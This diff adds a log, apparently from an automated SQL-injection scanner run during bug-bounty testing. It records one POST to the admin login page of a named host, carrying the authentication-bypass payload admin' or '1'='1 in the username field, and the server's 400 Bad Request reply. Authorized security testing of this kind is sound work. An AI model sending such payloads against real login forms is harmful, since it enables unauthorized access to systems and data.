@@ -1,0 +1,25 @@
+[zms-sqli] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/index.php
+
+
+POST /admin/index.php HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 55
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+username=admin%27+or+%271%27%3D%271&password=any&login=
+[zms-sqli] Dumped HTTP response https://techsolutions.bitpanda.com/admin/index.php
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Via: 1.1 f96e72cfd61c675b75ea8547da63de24.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: bl77H8sMkoWgM0kTtIb_a9Iie_m4_o50pBtI9ApXG1xCe9Ts9Mei0A==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
